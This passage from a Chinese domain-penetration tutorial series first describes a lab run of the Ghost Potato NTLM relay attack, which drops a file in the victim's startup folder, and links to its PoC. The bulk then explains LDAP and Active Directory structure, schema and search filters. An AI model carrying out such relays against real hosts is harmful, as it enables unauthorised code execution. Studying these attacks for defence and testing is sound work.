<p>然而这个缓存(Challenge,cifs&#x2F;B)是有时效性的，这个时间是300秒，也就是说300秒后，缓存(Challenge,cifs&#x2F;B)就会被清空，这个时候即使主机A和主机B是同一台主机，那么由于缓存已经被清除，那么去lsass里面肯定找不到缓存(Challenge,cifs&#x2F;B)。</p>
<p>漏洞利用图如下所示。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c707eea9eb0e44c1.png"></p>
<p>shenaniganslabs也放出漏洞利用<a href="https://shenaniganslabs.io/files/impacket-ghostpotato.zip">poc</a>。基于impacket进行修改。只实现的收到http协议的情况。其他协议大家可以自己实现。主要核心代码如下所示。会在sleep 315秒之后再发送type3。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0190f45fd835bedd51.png"></p>
<p>poc的运行如下。<br>受害者机子的ip是172.16.228.134,攻击者IP是172.16.228.1</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b8d715f5d5e98e18.png"></p>
<ol>
<li>在172.16.228.1开启端口等待172.16.228.134的ntlm请求(作者的poc只支持http)</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e4e2bfc8f886416e.png"></p>
<ol start="2">
<li>172.16.228.134向172.16.228.1发起http请求(为什么不用ip，请看前面的文章)</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01da5bfa6ca050ebf2.png"></p>
<ol start="3">
<li>172.16.228.1将来自172.16.228.134的请求Relay回172.16.228.134本身的smb，exp的实现效果是在172.16.228.134启动目录上传个文件</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014bf0fcb508394c78.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f6c3491f7a4edd03.png"></p>
<h1 id="LDAP-篇"><a href="#LDAP-篇" class="headerlink" title="LDAP 篇"></a>LDAP 篇</h1><h2 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h2><h3 id="前言-8"><a href="#前言-8" class="headerlink" title="前言"></a>前言</h3><p>这是LDAP篇的第一章节。在域渗透中，可能大家对Active Directory，LDAP，Naming Context这些概念既熟悉又模糊，比如Active Directory跟LDAP有啥关系等等。在LDAP篇，我们将系统地介绍跟Active Directory相关的方方面面。第一块主要介绍一些基本概念，让大家对整个Active Directory有个基本印象。在之后的分块里面会陆续介绍Active Directory相关的方方面面。包括但不限于。</p>
<ul>
<li>域内用户介绍</li>
<li>域内组介绍</li>
<li>域内ACL介绍</li>
<li>域信任关系介绍</li>
<li>组策略介绍</li>
</ul>
<p>这一部分对一些专业词汇统一保留英文</p>
<h3 id="LDAP简介"><a href="#LDAP简介" class="headerlink" title="LDAP简介"></a>LDAP简介</h3><p>LDAP全称是Lightweight Directory Access Protocol，轻量目录访问协议。顾名思义，LDAP是设计用来访问目录数据库的一个协议。</p>
<p>在这之前我们先介绍一下目录服务。目录数据库是由目录服务数据库和一套访问协议组成。</p>
<p>目录服务数据库也是一种数据库，这种数据库相对于我们熟知的关系型数据库(比如MySQL,Oracle),主要有以下几个方面的特点。</p>
<ol>
<li>它成树状结构组织数据，类似文件目录一样。</li>
<li>它是为查询、浏览和搜索而优化的数据库，也就是说LDAP的读性能特别强，但是写性能差，而且还不支持事务处理、回滚等复杂功能。</li>
</ol>
<p>为了能够访问目录数据库，必须设计一台能够访问目录服务数据库的协议，LDAP是其中一种实现协议。</p>
<p>为了方便大家理解下面举个例子来介绍一些LDAP相关的东西。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01781f2de2d2707237.png"></p>
<p>如上图所示是目录服务数据库，它成树状结构组织数据。下面介绍一些基本概念</p>
<ol>
<li>目录树：如上图所示，在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目。</li>
<li>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）。比如图中的每个圆圈都是一条记录。</li>
<li>DN,RDN:比如说第一个叶子条目，他有一个唯一可区分的名称DN:uid&#x3D;bob,ou&#x3D;people,dc&#x3D;acme,dc&#x3D;org。类似于文件目录的相对路径绝对路径，他除了有个DN之外，还有个RDN，他与目录结构无关，比如之前咱们提过的uid&#x3D;bob,ou&#x3D;people,dc&#x3D;acme,dc&#x3D;org，他的RDN就是uid&#x3D;bob</li>
<li>属性：描述条目具体信息。比如&#96;uid&#x3D;bill,ou&#x3D;people,dc&#x3D;acme,dc&#x3D;org，他有属性name 为bill，属性age为11，属性school 为xx。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01900f7cd08682777d.png"></p>
<h3 id="Active-Directory简介"><a href="#Active-Directory简介" class="headerlink" title="Active Directory简介"></a>Active Directory简介</h3><p>不同厂商对目录服务数据库的实现不一，常见的如下实现。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0178ac16e10816f3ea.png"></p>
<p>可以看出Active Directory，是微软的对目录服务数据库的实现，而LDAP是设计用来对目录服务数据库(在这里的实现就是微软的Active Directory)的访问的协议。Active Directory存储着整个域内所有的计算机，用户等的所有信息。</p>
<p>如果我们想访问域内的Active Directory，有两种办法</p>
<ol>
<li>域内的每一台域控都有一份完整的本域的Active Directory，可以通过连接域控的389&#x2F;636端口(636端口是LDAPS)来进行连接查看修改。</li>
<li>如果用户知道某个对象处于哪个域，也知道对象的标识名，那么通过上面第一种方式搜索对象就非常容易。但是考虑到这种情况，不知道对象所处的域，我们不得不去域林中的每个域搜索。为了解决这个问题，微软提出全局编录服务器(GC，Global Catalog)，  全局编录服务器中除了保存本域中所有对象的所有属性外，还保存林中其它域所有对象的部分属性，这样就允许用户通过全局编录信息搜索林中所有域中对象的信息。也就是说如果需要在整个林中进行搜索，而不单单是在具体的某个域进行搜索的时候，可以连接域控的3268&#x2F;3269端口。</li>
</ol>
<h3 id="Naming-Context和Application-Partitions"><a href="#Naming-Context和Application-Partitions" class="headerlink" title="Naming Context和Application Partitions"></a>Naming Context和Application Partitions</h3><p>之前的内容都是在讲Active Directory的基本概念，接下来我们来具体的探究下Active Directory具体有啥东西。</p>
<h4 id="Naming-Context"><a href="#Naming-Context" class="headerlink" title="Naming Context"></a>Naming Context</h4><p>首先有一点得明确，Active Directory具有分布式特性，一个林中有若干个域，每个域内有若干台域控，每台域控有一个独立的Active Directory。这个时候就有必要将数据隔离到多个分区中，如果不隔离的话，则每个域控制器都必须复制林中的所有数据。若隔离为若干个分区之后，就可以有选择性的复制某几个分区。微软将Active Directory划分为若干个分区(这个分区我们称为Naming Context，简称NC)，每个Naming Context都有其自己的安全边界。</p>
<p>Active Directory预定义了三个Naming Context</p>
<ul>
<li>Configuration NC(Configuration NC)</li>
<li>Schema NC(Schema NC)</li>
<li>Domain NC(DomainName NC)</li>
</ul>
<p>我们使用ADExplorer连接进来就可以看到这三个(后面两个是引用程序分区，后面会讲)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0194ff78d4143b1a5f.png"></p>
<p>我们来简单的介绍下这三个Naming Context</p>
<ul>
<li>Configuration NC(Configuration NC)</li>
</ul>
<p>配置NC,林配置信息的主要存储库，包含有关站点，服务，分区和Active DirectorySchema 的信息，并被复制到林中的每个域控制器。配置NC的根位于配置容器中，该容器是林根域的子容器。例如，test.local林将为CN&#x3D;Configuration,DC&#x3D;test,DC&#x3D;local</p>
<p>下面我们来看看这个Naming Context的顶级容器有哪些。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f33589dc918ac407.png"></p>
<table>
<thead>
<tr>
<th align="center">RDN</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CN&#x3D;DisplaySpecifiers</td>
<td align="center">定义了Active Directory管理单元的各种显示格式</td>
</tr>
<tr>
<td align="center">CN&#x3D;Extended-Rights</td>
<td align="center">扩展权限对象的容器</td>
</tr>
<tr>
<td align="center">CN&#x3D;ForestUpdates</td>
<td align="center">包含用于表示森林状态和与域功能级别更改的对象</td>
</tr>
<tr>
<td align="center">CN&#x3D;Partitions</td>
<td align="center">包含每个Naming Context，Application Partitions以及外部LDAP目录引用的对象</td>
</tr>
<tr>
<td align="center">CN&#x3D;Physical Locations</td>
<td align="center">包含位置对象，可以将其与其他对象关联 以表示该对象的位置。</td>
</tr>
<tr>
<td align="center">CN&#x3D;Physical Locations</td>
<td align="center">包含位置对象，可以将其与其他对象关联 以表示该对象的位置。</td>
</tr>
<tr>
<td align="center">CN&#x3D;Services</td>
<td align="center">存储有关服务的配置信息，比如文件复制服务</td>
</tr>
<tr>
<td align="center">CN&#x3D;Sites</td>
<td align="center">包含所有站点拓扑和复制对象</td>
</tr>
<tr>
<td align="center">CN&#x3D;WellKnown Security Principals</td>
<td align="center">包含常用的外部安全性主题的对象，比如Anonymous，Authenticated Users，Everyone等等</td>
</tr>
</tbody></table>
<ul>
<li>Schema NC(Schema NC)</li>
</ul>
<p>包含Schema 信息，该Schema 信息定义Active Directory中使用的类，对象和属性。与域NC和配置 NC 不同，模式 NC 不维护容器或组织单位的层次结构。相反，它是具有 classSchema ，attributeSchema 和 subSchema 对象的单个容器。关于这个Naming Context的详细内容我们将在下一节里面详细讲。</p>
<ul>
<li>Domain NC(DomainName NC)</li>
</ul>
<p>每个域都有一个域Naming Context，不同的域内有不同的域Naming Context，其中包含特定于域的数据。这个域Naming Context(的根由域的专有名称(DN)表示，比如corp.test.local域的DN将为dc&#x3D;corp,dc&#x3D;test,dc&#x3D;local。之前我们说过，域内的所有计算机，所有用户的具体信息都存在Active Directory底下，具体来说，就是在Active Directory的这个Naming Context里面。我们用工具查看的默认Naming Context选的也是这个Naming Context。后面对域内很多东西的查看都在这个Naming Context里面。下面我们来看看这个Naming Context的顶级容器有哪些。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c20608fa29d15b74.png"></p>
<table>
<thead>
<tr>
<th align="center">RDN</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CN&#x3D;Builtin</td>
<td align="center">内置本地安全组的容器，包括管理员，域用户和账号操作员等等</td>
</tr>
<tr>
<td align="center">CN&#x3D;Computers</td>
<td align="center">机器用户的容器，包括加入域的所有机器</td>
</tr>
<tr>
<td align="center">OU&#x3D;Domain Controllers</td>
<td align="center">域控制器的容器，包括域内所有域控</td>
</tr>
<tr>
<td align="center">CN&#x3D;ForeignSecurityPrincipals</td>
<td align="center">代表域中来自森林外部域的组中的成员</td>
</tr>
<tr>
<td align="center">CN&#x3D;Keys</td>
<td align="center">Server 2016之后才有，关键凭证对象的默认容器</td>
</tr>
<tr>
<td align="center">CN&#x3D;Managed Service Accounts</td>
<td align="center">托管服务帐户的容器。</td>
</tr>
<tr>
<td align="center">CN&#x3D;System</td>
<td align="center">各种预配置对象的容器。包括信任对象，DNS对象和组策略对象</td>
</tr>
<tr>
<td align="center">CN&#x3D;TPM Devices</td>
<td align="center">可信平台模块(TPM)密钥的恢复信息的容器。</td>
</tr>
<tr>
<td align="center">CN&#x3D;Users</td>
<td align="center">用户和组对象的默认容器</td>
</tr>
</tbody></table>
<h4 id="Application-Partitions"><a href="#Application-Partitions" class="headerlink" title="Application Partitions"></a>Application Partitions</h4><p>从 Windows Server 2003 开始，微软允许用户自定义分区来扩展Naming Context的概念。Application Partitions其实就是Naming Context的一个扩展，它本质上还是属于Naming Context。管理员可以创建分区(这个分区我们称为区域)，以将数据存储在他们选择的特定域控制器上，Application Partitions主要有以下特点:</p>
<ol>
<li>Naming Context是微软预定义的，用户不可以定义自己的Naming Context。而如果用户想要定义一个分区，可以通过Application Partitions。虽然微软也预置了两个Application Partitions，但是Application Partitions的设计更多是为了让用户可以自定义自己的数据。设计Application Partitions最大的用途就是，让用户自己来定义分区。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a2bb466807c53a51.png"></p>
<ol start="2">
<li>Application Partitions可以存储动态对象。动态对象是具有生存时间(TTL) 值的对象，该值确定它们在被Active Directory自动删除之前将存在多长时间。也就说Application Partitions可以给数据设置个TTL，时间一到，Active Directory就删除该数据。</li>
</ol>
<p>下面演示通过ntdsutil创建Application Partitions:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01955f3c83d44008e6.png"></p>
<p>创建成功</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010567075683bbcec1.png"></p>
<p>我们可以通过查看rootDSE查看域内的所有Naming Context以及Application Partitions，在属性namingContexts里面。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f6df9329dd8e4f5.png"></p>
<h3 id="Schema-NC"><a href="#Schema-NC" class="headerlink" title="Schema NC"></a>Schema NC</h3><p>Schema NC里面包含Schema 信息，定义了Active Directory中使用的类和属性。所以在详细讲Schema NC之前我们先来讲一下LDAP里面的类和继承。</p>
<p>LDAP里面的类和继承，跟开发里面的面向对象一样，相信有过面向对象开发经验的，理解起来并不困难。</p>
<h4 id="LDAP-中的类和继承"><a href="#LDAP-中的类和继承" class="headerlink" title="LDAP 中的类和继承"></a>LDAP 中的类和继承</h4><p>类和实例<br>域内每个条目都是类的实例。而类是一组属性的集合。<br>举个例子:<br>域内机器<code>CN=WIN7</code>,<code>CN=Computers</code>,<code>DC=test</code>,<code>DC=local</code>在<code>Active Directory</code>里面是一个条目，里面有众多属性描述条目具体信息。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ae0cbb69bfbf7dbe.png"></p>
<p>而这个条目有哪些属性是由他的类决定的。比如说这里的条目是<code>CN=WIN7</code>,<code>CN=Computers</code>,<code>DC=test</code>,<code>DC=local</code>是类Computer的实例，在objectClass属性可以看到</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01de8ef5c174dda4ea.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01cf698d1681d67366.png"></p>
<p>类是可继承的。子类继承父类的所有属性，Top类是所有类的父类。在之前我们看objectClass的时候，可以看到条目是CN&#x3D;WIN7,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;local是类Computer的实例。但是我们注意到objectClass里面的值除了Computer之外，还有<code>top</code>,<code>person</code>,<code>organizationPerson</code>,<code>user</code>。这是因为objectClass保存了类继承关系。user是organizationPerson的子类， organizationPerson 是person的子类，person是top的子类。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0146db3ffc356a4b42.png"></p>
<p>类的分类<br>类有三种类型</p>
<ul>
<li><p>结构类（Structural）<br>结构类规定了对象实例的基本属性，每个条目属于且仅属于一个结构型对象类。前面说过域内每个条目都是类的实例，这个类必须是结构类。只有结构类才有实例。比如说前面说过的Computer类。</p>
</li>
<li><p>抽象类(Abstract)<br>抽象类型是结构类或其他抽象类的父类，它将对象属性中公共的部分组织在一起。跟面对对象里面的抽象方法一样，他没有实例，只能充当结构类或者抽象类的父类。比如说top 类。注意抽象类只能从另一个抽象类继承。</p>
</li>
<li><p>辅助类(Auxiliary）<br>辅助类型规定了对象实体的扩展属性。虽然每个条目只属于一个结构型对象类，但可以同时属于多个辅助型对象类。注意辅助类不能从结构类继承</p>
</li>
</ul>
<p>接下来让我们结合Schema NC中的类来具体理解下LDAP 中的类和继承</p>
<h4 id="Schema-NC中的类"><a href="#Schema-NC中的类" class="headerlink" title="Schema NC中的类"></a>Schema NC中的类</h4><p>如果我们要查看Schema NC的内容，除了传统使用LDAP编辑器查看</p>
<p>比如说ADExplorer</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b698f56e13c07b3a.png"></p>
<p>还可以使用微软自带的<code>Active Directory Schema</code></p>
<p>默认没有注册，运行regsvr32 schmmgmt.dll注册该dll</p>
<p>然后在mmc里面添加即可</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014471340ceb44a894.png"></p>
<p>域内每个条目都是类的实例。所有的类都存储在Schema NC里面，是Schema NC的一个条目。</p>
<p>我们以一个实例来说明。前面说过条目CN&#x3D;WIN7,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;local是类Computer的实例。那么类Computer就存储在Schema NC里面，是Schema NC的一个条目CN&#x3D;Computer,CN&#x3D;Schema,CN&#x3D;Configuration,DC&#x3D;test,DC&#x3D;local。</p>
<p>我们下面来具体分析下这个条目的一些通用属性，希望大家对类条目有个大概的认识。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e8b26f26192c1ab7.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01016857c026e18031.png"></p>
<ul>
<li>前面说过每个条目都是类的实例，而类是是Schema NC的一个条目。因此类条目也是一个类的实例，这个类是classSchema(<code>CN=Class-Schema,CN=Schema,CN=Configuration,DC=test,DC=local</code>)。所有的类条目都是classSchema类的实例。</li>
</ul>
<p>我们可以在objectclass属性里面看到:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019c666e1f4f7a4221.png"></p>
<ul>
<li><p>名称是Computer(通过adminDescription，adminDisplayName，cn，name属性)</p>
</li>
<li><p>defaultSecurityDescriptor这个属性表明，如果在创建Computer这个类的实例的时候，如果没指定ACL，就用这个属性的值作为实例的ACL。在实例的nTSecurityDescriptor里面。</p>
</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015a2129f90f3b1297.png"></p>
<p>注意跟nTSecurityDescriptor区分开来，nTSecurityDescriptor是这个条目的ACL，而defaultSecurityDescriptor是实例默认的ACL。举个例子。<br>CN&#x3D;Computer,CN&#x3D;Schema,CN&#x3D;Configuration,DC&#x3D;test,DC&#x3D;local 有两个属性nTSecurityDescriptor，defaultSecurityDescriptor。nTSecurityDescriptor是这条条目的ACL。<br>那Computer的实例化对象CN&#x3D;WIN7,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;local，如果在创建的时候，没有指定ACL，那么他的nTSecurityDescriptor的值就是CN&#x3D;Computer,CN&#x3D;Schema,CN&#x3D;Configuration,DC&#x3D;test,DC&#x3D;local 的属性defaultSecurityDescriptor的值。</p>
<ul>
<li>属性rDNAttID表明通过LDAP连接到类的实例的时候，使用的两个字母的前缀用过是cn。<br>所以他的实例CN&#x3D;WIN7,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;local,使用的前缀是cn。<br>这个我们再举个例子<br>比如条目OU&#x3D;Domain Controllers,DC&#x3D;test,DC&#x3D;locals 是一个ou，它是类organizationalUnit的实例</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a6bc32faeec6eb5d.png"></p>
<p>我们查看类organizationalUnit对应的条目CN&#x3D;Organizational-Unit,CN&#x3D;Schema,CN&#x3D;Configuration,DC&#x3D;test,DC&#x3D;local,就可以看到</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01cb815ec922829786.png"></p>
<p>所以对于他的一个实例，他的前缀是OU，OU&#x3D;Domain Controllers</p>
<ul>
<li><p>属性objectClassCategory为1说明他是一个结构类</p>
<ol>
<li>代表是个结构类</li>
<li>代表是个抽象类</li>
<li>代表是个辅助类</li>
</ol>
</li>
<li><p>属性subClassOf 表明他的父类是user类</p>
</li>
<li><p>systemPossSuperior约束了他的实例只能创建在这三个类<code>container</code>,<code>organizationalUnit</code>,<code>domainDNS</code>的实例底下。</p>
</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01159f5461af2e1994.png"></p>
<p>比如computer类的一个实例，CN&#x3D;WIN7,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;local，它位于容器CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;local底下，而CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;local是container的实例，container在systemPossSuperior底下，这不违反这个约束。</p>
<ul>
<li>最后一点也是最核心的，我们来讲下他的实例是怎么获取到基本属性的。</li>
<li>这个类没有属性systemMustContain和MustContain，因此强制属性</li>
<li>这个类属性systemMayContain和MayContain是可选的属性</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0142089bf16de91ff8.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01bc843dea75ffc9b6.png"></p>
<ul>
<li>上面这四个属性里面的属性集合是这个类独有的属性集合，我们之前说过，类是可继承的。因此一个类的属性集合里面除了前面的四个属性里面的值，还可能来自父类以及辅助类。</li>
<li>辅助类的属性字段是systemAuxiliaryClass,这里面的computer类没有辅助类</li>
<li>父类 可以通过subClassOf查看，这里是computer类的父类是user类。然后网上递归，user类查看那四个属性，以及他的辅助类，父类。直到top类。</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010ff18e82445400b8.png"></p>
<p>所以最后我们用Active DirectorySchema 查看的时候，就会看到属性的类型是可选还是强制，源类是哪个类。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018e1b2cf6d4e49573.png"></p>
<h4 id="Schema-NC中的属性"><a href="#Schema-NC中的属性" class="headerlink" title="Schema NC中的属性"></a>Schema NC中的属性</h4><p>Schema NC除了定义了Active Directory中使用的类，还定义了Active Directory中使用的属性。</p>
<p>关于属性，我们之前接触的够多了。这里不再多做解释。</p>
<p>每个属性都是一个条目，是类attributeSchema的实例</p>
<p>在域内的所有属性必须在这里定义，而这里的条目，最主要的是限定了属性的语法定义。其实就是数据类型，比如 Boolean类型，Integer类型等。</p>
<p>以<code>CN=Object-Sid,CN=Schema,CN=Configuration,DC=test,DC=local</code>为例。</p>
<p>他的attributeSyntax是2.5.5.17</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01909ef5479f89015e.png"></p>
<p>oMSyntax是</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017c83d5943a2589d4.png"></p>
<p>通过查表</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01110de96a7eeb8a2d.png"></p>
<p>关于各种语法定义在这里不再这里一个个介绍，过于抽象，将在后面章节里面实际的案例根据需要详细讲解。</p>
<h3 id="搜索Active-Directory"><a href="#搜索Active-Directory" class="headerlink" title="搜索Active Directory"></a>搜索Active Directory</h3><p>通过查询目录，可以直接收集到要求的数据。查询目录需要指定两个要素</p>
<ul>
<li>BaseDN</li>
<li>过滤规则</li>
</ul>
<ol>
<li>BaseDN</li>
</ol>
<p>BaseDN指定了这棵树的根。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01eaaf8466526c53fa.png"></p>
<p>比如指定BaseDN为DC&#x3D;test.DC&#x3D;local就是以DC&#x3D;test.DC&#x3D;local为根往下搜索</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011b739e13227aa815.png"></p>
<p>BaseDN为<code>CN=Users,DC=test.DC=local</code>就是以<code>CN=Users,DC=test.DC=local</code>为根往下搜索</p>
<h4 id="过滤规则"><a href="#过滤规则" class="headerlink" title="过滤规则"></a>过滤规则</h4><p>LDAP 过滤规则相对简单，很方便入手</p>
<p>LDAP 搜索过滤器语法有以下子集：</p>
<ul>
<li>用与号 (&amp;) 表示的 AND 运算符。</li>
<li>用竖线 (|) 表示的 OR 运算符。</li>
<li>用感叹号 (!) 表示的 NOT 运算符。</li>
<li>用名称和值表达式的等号 (&#x3D;) 表示的相等比较。</li>
<li>用名称和值表达式中值的开头或结尾处的星号 (*) 表示的通配符。</li>
</ul>
<p>下面举几个例子</p>
<ul>
<li>(uid&#x3D;testuser)<br>匹配 uid 属性为testuser的所有对象</li>
<li>(uid&#x3D;test*)<br>匹配 uid 属性以test开头的所有对象</li>
<li>(!(uid&#x3D;test*))<br>匹配 uid 属性不以test开头的所有对象</li>
<li>(&amp;(department&#x3D;1234)(city&#x3D;Paris))<br>匹配 department 属性为1234且city属性为Paris的所有对象</li>
<li>(|(department&#x3D;1234)(department&#x3D;56*))<br>匹配 department 属性的值刚好为1234或者以56开头的所有对象。</li>
</ul>
<p>一个需要注意的点就是运算符是放在前面的，跟我们之前常规思维的放在中间不一样</p>
<p>关于查询目录还有一些高级点的用法，比如 LDAP 控件，位掩码等。这里不一一列举，将在后面实际用到的时候再列举。</p>
<h3 id="相关工具介绍"><a href="#相关工具介绍" class="headerlink" title="相关工具介绍"></a>相关工具介绍</h3><p>下面介绍一些能够访问Active Directory的工具</p>
<h4 id="ADSI-编辑器"><a href="#ADSI-编辑器" class="headerlink" title="ADSI 编辑器"></a>ADSI 编辑器</h4><p>微软自带，输入adsiedit.msc可访问</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0163d5d7662c88d781.png"></p>
<h4 id="LDP"><a href="#LDP" class="headerlink" title="LDP"></a>LDP</h4><p>微软自带，输入ldp可访问</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0136ee6369a0f72a10.png"></p>
<h4 id="ADExplorer"><a href="#ADExplorer" class="headerlink" title="ADExplorer"></a><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">ADExplorer</a></h4><p>sysinternals系列的工具,相较于ADSI 编辑器，更方便</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0184969163d2336b86.png"></p>
<h4 id="The-LDAP-Explorer"><a href="#The-LDAP-Explorer" class="headerlink" title="The LDAP Explorer"></a><a href="http://www.ldapexplorer.com/index.htm">The LDAP Explorer</a></h4><p>付费版的神器，特别强大，比ADExplorer都强大，自己感受下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0153db44564f80826a.png"></p>
<h4 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h4><p>openldap里面的工具，在*nix里面比较常用</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016cf21be78fc242f5.png"></p>
<p>导出的格式为LDIF格式，有人写了个工具支持导出为sqlite文件，然后阅读sqlite文件</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01da656fdea14fde24.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018a373c495f70ac04.png"></p>
<h4 id="adfind-与-admod"><a href="#adfind-与-admod" class="headerlink" title="adfind 与 admod"></a><a href="http://www.joeware.net/freetools/tools/adfind/">adfind</a> 与 <a href="http://www.joeware.net/freetools/tools/admod/">admod</a></h4><p>这个是最牛逼的命令行工具了，在域渗透里面的出场率极高，adfind用于查询，admod用于修改。这个系列的主要块会围绕着这两个工具展开。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012a433ba774c27e7d.png"></p>
<h2 id='p9'>组和OU介绍</h2>

<h3 id="前言-9"><a href="#前言-9" class="headerlink" title="前言"></a>前言</h3><p>这块文章主要介绍AD里面的组和组织单位(OU)。</p>
<h3 id="一些LDAP高级搜索语法"><a href="#一些LDAP高级搜索语法" class="headerlink" title="一些LDAP高级搜索语法"></a>一些LDAP高级搜索语法</h3><h4 id="LDAP-查找中的位操作"><a href="#LDAP-查找中的位操作" class="headerlink" title="LDAP 查找中的位操作"></a>LDAP 查找中的位操作</h4><p>在LDAP 里面，有些字段是位字段，这里以userAccountControl举例，关于这个字段的详细意义，后面会详细介绍，这里先把他当做一个普通的位字段，不去考虑他的具体含义，这里先看下他的内容。</p>
<p>他的属性类位于架构分区的<code>CN=User-Account-Control,CN=Schema,CN=Configuration,DC=test,DC=local</code></p>
<p><code>attributeSyntax</code>是<code>2.5.5.9,oMSyntax</code>是2。</p>
<p>查表可知是32位的Integer类型。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015c2e48724038887f.png"></p>
<p>之所以我们说他是位字段，是因为他是由一个个位构成。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014df9519f018df4a7.png"></p>
<p>比如说一个账户，他的LOCKOUT，以及NOT_DELEGATED，其他的位都没有，那这个用户的属性userAccountControl的值就为0x100000+0x0010。是个32 位 int 类型。</p>
<p>那现在的难题就变成。如果我要搜索域内所有设置了NOT_DELEGATED的所有对象。那在上一篇文章里面我们学到的LDAP语法就显得力不从心。因为上一篇文章的语法只能对某个属性进行过滤，还不能对属性里面的某个具体位进行过滤，这也是我们这一节要讲的内容。LDAP的语法支持按位搜索。</p>
<p>执行过滤器以搜索位字段，必须遵循以下语法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;属性名称&gt;：&lt;BitFilterRule-ID&gt; := &lt;十进制比较值&gt;</span><br></pre></td></tr></table></figure>

<p>其中的<code>BitFilterRule-ID</code>，内容如下。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a25c7551c331ecdc.png"></p>
<p>我们最常的是AND ，也就是<code>1.2.840.113556.1.4.803</code></p>
<p>我们举几个例子。</p>
<p>我们想查询哪些对象设置了<code>TRUSTED_FOR_DELEGATION</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01623cf8677b23bb1a.png"></p>
<p><code>TRUSTED_FOR_DELEGATION</code>对应的十进制比较值位524288</p>
